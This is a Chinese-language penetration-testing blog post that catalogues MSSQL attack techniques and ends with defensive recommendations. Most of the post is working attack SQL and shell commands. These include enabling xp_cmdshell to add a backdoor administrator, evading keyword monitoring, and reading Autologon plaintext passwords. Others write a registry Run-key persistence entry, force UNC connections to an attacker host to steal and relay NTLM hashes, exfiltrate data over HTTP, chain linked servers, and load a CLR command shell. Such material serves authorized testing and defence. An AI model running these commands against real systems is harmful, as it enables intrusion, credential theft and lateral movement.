---
title: MSSQL数据库攻击面
date: 2025-09-05 08:00:00
tags:
  - 内网渗透
  - 数据库安全
  - 渗透测试
categories: 渗透测试
---

## 前言

Microsoft SQL Server（MSSQL）是内网渗透中极具价值的攻击目标。它不仅存储着业务敏感数据，更因其丰富的系统存储过程和扩展机制，成为攻击者横向移动、提权的重要跳板。本文系统梳理MSSQL数据库的攻击面，涵盖命令执行、注册表操作、文件系统探测、OLE自动化、链接服务器利用、UNC哈希窃取、PowerUpSQL模块及CLR程序集提权等核心技术。

> **免责声明：** 本文所述技术仅供安全研究与学习参考，请勿用于非法用途。因不当使用造成的任何法律后果，作者概不负责。

## 一、典型攻击场景

假设条件：攻击者已获取MSSQL连接凭证（SQL注入、弱口令爆破、配置文件泄露等途径）；目标为Windows Server，SQL Server以 `NT SERVICE\MSSQLSERVER` 或 `LocalSystem` 身份运行；内网中存在域控、文件服务器等主机。

```bash
# 常用连接方式
impacket-mssqlclient sa:Password123@192.168.1.100
sqlcmd -S 192.168.1.100 -U sa -P Password123     # Windows环境
```

## 二、xp_cmdshell —— 经典命令执行

`xp_cmdshell` 以SQL Server服务账户权限在操作系统层执行任意命令。SQL Server 2005起默认禁用，需 `sysadmin` 角色启用。

```sql
-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行系统命令
EXEC master.dbo.xp_cmdshell 'whoami';
EXEC master.dbo.xp_cmdshell 'ipconfig /all';
EXEC master.dbo.xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC master.dbo.xp_cmdshell 'net localgroup administrators hacker /add';
```

若 `xp_cmdshell` 被删除（`sp_dropextendedproc`），可尝试重建：

```sql
EXEC sp_addextendedproc xp_cmdshell, 'xplog70.dll';
```

绕过简单监控的一些手段：

```sql
-- 通过 sp_executesql 间接调用
DECLARE @cmd NVARCHAR(4000) = 'EXEC xp_cmdshell ''whoami''';
EXEC sp_executesql @cmd;

-- 变量拼接规避关键字匹配
DECLARE @a NVARCHAR(100)='who',@b NVARCHAR(100)='ami';
EXEC xp_cmdshell @a+@b;
```

## 三、xp_regread / xp_regwrite —— 注册表读写

这两个扩展存储过程允许在SQL Server上下文中读写Windows注册表，能用于信息收集、凭证提取及持久化。

### 3.1 读取注册表信息

```sql
-- 读取 LSA 配置
EXEC master.dbo.xp_regread N'HKEY_LOCAL_MACHINE',
    N'SYSTEM\CurrentControlSet\Control\Lsa', N'LSA';

-- 读取 RDP 端口号
EXEC master.dbo.xp_regread N'HKEY_LOCAL_MACHINE',
    N'SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp',
    N'PortNumber';

-- 提取 Autologon 明文凭据
EXEC master.dbo.xp_regread N'HKEY_LOCAL_MACHINE',
    N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    N'DefaultPassword';
```

### 3.2 写入注册表实现持久化

```sql
-- 启用远程桌面
EXEC master.dbo.xp_regwrite N'HKEY_LOCAL_MACHINE',
    N'SYSTEM\CurrentControlSet\Control\Terminal Server',
    N'fDenyTSConnections', N'REG_DWORD', 0;

-- 注册启动项
EXEC master.dbo.xp_regwrite N'HKEY_LOCAL_MACHINE',
    N'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    N'SQLService', N'REG_SZ', 'C:\windows\temp\backdoor.exe';
```

> 注意：两者均需 `sysadmin` 角色或对目标注册表项的具体访问权。

## 四、xp_dirtree —— 文件探测与UNC哈希窃取

`xp_dirtree` 用于列出目录内容，仅需 `public` 权限即可执行。当参数为UNC路径时，SQL Server将通过SMB协议连接远程主机并发起NTLM认证——攻击者可借此捕获Net-NTLM哈希。

### 4.1 文件系统探测

```sql
-- 列出目录结构
EXEC master.dbo.xp_dirtree 'C:\', 1, 1;
EXEC master.dbo.xp_dirtree 'C:\Users\Administrator\Desktop', 1, 1;

-- 搜索特定文件（配合临时表）
CREATE TABLE #tmp (sub NVARCHAR(512), depth INT, isf INT);
INSERT INTO #tmp EXEC master.dbo.xp_dirtree 'C:\inetpub\wwwroot', 2, 1;
SELECT * FROM #tmp WHERE sub LIKE '%.aspx'; DROP TABLE #tmp;
```

### 4.2 UNC路径哈希窃取

这是横向移动中的关键技巧。攻击者启动SMB监听或Responder，诱使SQL Server访问UNC路径：

```sql
-- 三种触发UNC访问的方法
EXEC master.dbo.xp_dirtree '\\192.168.1.50\share', 1, 1;
EXEC master.dbo.xp_fileexist '\\192.168.1.50\share\foo.txt';
EXEC master.dbo.xp_subdirs '\\192.168.1.50\share';
```

攻击者侧：

```bash
sudo responder -I eth0 -v                        # 监听SMB请求
impacket-smbserver -smb2support share /tmp/share # 或使用impacket
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt  # 破解哈希
```

### 4.3 NTLM中继

若无法破解哈希，可将其中继到不支持SMB签名的内网主机：

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

## 五、SP_OACreate 与 OLE 自动化过程

OLE Automation Procedures 允许通过 `sp_OACreate` 创建COM对象并调用其方法。默认禁用，需 `sysadmin` 启用。相比 `xp_cmdshell`，它能借助任意COM对象实现更多样化的操作。

```sql
-- 启用
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

### 5.1 文件操作（Scripting.FileSystemObject）

```sql
DECLARE @fso INT, @file INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT,
    'C:\temp\shell.txt', 2, 1;
EXEC sp_OAMethod @file, 'WriteLine', NULL, 'Hello from MSSQL';
EXEC sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @fso;
```

### 5.2 命令执行（WScript.Shell）

```sql
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL,
    'cmd /c whoami > C:\temp\out.txt', 0, 1;
EXEC sp_OADestroy @shell;
```

### 5.3 HTTP外传（MSXML2.ServerXMLHTTP）

```sql
DECLARE @http INT, @result INT;
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @http OUTPUT;
EXEC sp_OAMethod @http, 'open', NULL,
    'GET', 'http://192.168.1.50:8080/exfil?d=from_mssql', 0;
EXEC sp_OAMethod @http, 'send', @result OUTPUT;
EXEC sp_OADestroy @http;
```

### 5.4 WMI横向移动（WbemScripting.SWbemLocator）

```sql
DECLARE @obj INT, @svc INT;
EXEC sp_OACreate 'WbemScripting.SWbemLocator', @obj OUTPUT;
EXEC sp_OAMethod @obj, 'ConnectServer', @svc OUTPUT,
    '192.168.1.200', 'root\cimv2', 'DOMAIN\user', 'password';
EXEC sp_OADestroy @obj;
```

## 六、链接服务器（Linked Server）链式攻击

链接服务器允许一个SQL Server实例对远程数据源执行查询。当攻破一台MSSQL后，利用已配置的链接服务器可实现横向移动甚至跨域攻击。

### 6.1 信息收集

```sql
SELECT @@SERVERNAME;                        -- 当前实例名
EXEC sp_linkedservers;                      -- 列出链接服务器
SELECT * FROM sys.servers WHERE is_linked=1; -- 详细配置
```

### 6.2 在链接服务器上执行命令

```sql
-- OPENQUERY 方式
SELECT * FROM OPENQUERY("TARGET",
    'SELECT @@VERSION');
SELECT * FROM OPENQUERY("TARGET",
    'EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;
     EXEC xp_cmdshell ''whoami''');

-- EXEC AT 方式（SQL Server 2005+）
EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;')
    AT "TARGET";
EXEC ('EXEC xp_cmdshell ''whoami''') AT "TARGET";
```

### 6.3 多级链式跳板

```sql
-- SERVER_A -> SERVER_B -> SERVER_C
SELECT * FROM OPENQUERY("SERVER_A",
    'SELECT * FROM OPENQUERY("SERVER_B",
        ''EXEC xp_cmdshell ''''whoami'''' '')');
```

> 登录映射（Login Mapping）决定了在远程服务器上的执行身份。"当前安全上下文"模式权限取决于当前用户，固定账户映射则以该账户执行。

## 七、PowerUpSQL —— 自动化攻击模块

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 是NetSPI开发的MSSQL安全评估PowerShell工具集，集成实例发现、审计、提权和漏洞利用功能。

### 7.1 实例发现

```powershell
Import-Module PowerUpSQL.psd1
Get-SQLInstanceLocal                             # 本机实例
Get-SQLInstanceBroadcast                         # UDP广播发现
Get-SQLInstanceDomain                            # SPN扫描域内实例

# 审计弱口令和默认凭证
Invoke-SQLAuditDefaultAccounts -Instance "192.168.1.100"
Invoke-SQLAuditWeakLoginPw -Instance "192.168.1.100"
```

### 7.2 自动化利用

```powershell
# UNC路径哈希窃取（配合Responder）
Invoke-SQLUncPathInjection -Instance "192.168.1.100"

# 自动配置xp_cmdshell并执行命令
Invoke-SQLOSCmd -Instance "192.168.1.100" -Command "whoami" -Verbose

# 审计OLE Automation配置
Invoke-SQLAuditOleAutomation -Instance "192.168.1.100"

# 搜索敏感列数据
Get-SQLColumnSampleData -Instance "192.168.1.100" `
    -Keywords "password,secret,pass,credit,ssn"

# 爬取所有链接服务器并链式渗透
Get-SqlServerLinkCrawl -Instance "SQL01\PROD" -Verbose

# ADCS中继攻击（ESC8）
Invoke-SQLADCSReplay -Instance "192.168.1.100" -Verbose
```

## 八、CLR程序集提权（简述）

SQL Server CLR集成允许在数据库中注册并执行.NET程序集。拥有 `sysadmin` 或 `CREATE ASSEMBLY` 权限时，可创建CLR存储过程以服务账户权限执行系统命令。当 `xp_cmdshell` 和OLE Automation均不可用或被严格监控时，CLR成为高级替代方案。

利用流程：编写C#类库实现命令执行 -> 编译DLL转十六进制字符串 -> `CREATE ASSEMBLY` 注册 -> 创建CLR存储过程 -> 调用执行。

```sql
-- 注册CLR程序集（HEX DLL）
CREATE ASSEMBLY [SqlShell] AUTHORIZATION [dbo]
    FROM 0x4D5A90000300000004000000FFFF000... -- 完整HEX省略
    WITH PERMISSION_SET = UNSAFE;
GO

-- 绑定CLR存储过程
CREATE PROCEDURE [dbo].[CmdExec] @cmd NVARCHAR(MAX)
AS EXTERNAL NAME [SqlShell].[StoredProcedures].[CmdExec];
GO

-- 执行命令
EXEC CmdExec 'whoami';
```

> CLR程序集攻击的完整原理、DLL编写技巧与免杀方案，请参阅：**[MSSQL CLR程序集权限提升详解](/MSSQL-CLR-Assembly-Privilege-Escalation/)**。

## 九、技术对比总结

| 技术 | 所需权限 | 默认状态 | 核心攻击价值 | 监控关注度 |
|------|----------|----------|-------------|-----------|
| xp_cmdshell | sysadmin | 禁用 | 直接命令执行 | 高 |
| xp_regread/write | sysadmin | 启用 | 注册表读写与持久化 | 中 |
| xp_dirtree | public | 启用 | 文件探测 / UNC哈希窃取 | 低 |
| SP_OACreate | sysadmin | 禁用 | COM对象调用 / 多态执行 | 中高 |
| Linked Server | 视映射 | 视配置 | 横向移动 / 跨实例攻击 | 中 |
| PowerUpSQL | 有效凭据 | N/A | 自动化攻击 | N/A |
| CLR Assembly | sysadmin/DBA | 视配置 | 免杀命令执行 / 持久化 | 中高 |

## 十、防御建议

1. **最小权限：** 避免以 `LocalSystem` 运行MSSQL，改用托管服务账户（gMSA）或低权限域账户。
2. **关闭危险功能：** 生产环境禁用 `xp_cmdshell`、`Ole Automation Procedures`，移除不需要的扩展存储过程。
3. **网络隔离：** 限制MSSQL主机出站SMB（445端口），阻止UNC哈希外泄；配置防火墙仅允许应用层访问数据库。
4. **强制SMB签名：** 内网Windows主机启用SMB签名，阻断NTLM中继攻击。
5. **审计与监控：** 监控对 `sp_configure`、`xp_cmdshell`、`sp_OACreate` 的调用；对链接服务器的异常跨实例查询进行告警。
6. **补丁管理：** 保持MSSQL与Windows及时更新，修复已知提权漏洞。
7. **审查链接服务器：** 清理长期未使用的链接服务器配置，移除低信任关系的链接。

## 结语

MSSQL的攻击面从系统存储过程到OLE自动化、从链接服务器到CLR运行时，每一条路径都可能成为攻击者横向移动与权限提升的通道。防御者理解这些攻击面是构建纵深防御的前提，渗透测试者熟练掌握这些技术则能在授权评估中更全面地暴露安全风险。建议读者继续学习 **[MSSQL CLR程序集权限提升详解](/MSSQL-CLR-Assembly-Privilege-Escalation/)**，并结合《内网信息收集指南》《NTLM中继攻击实战》《Kerberos票据攻击》等文章构建完整的内网渗透知识体系。
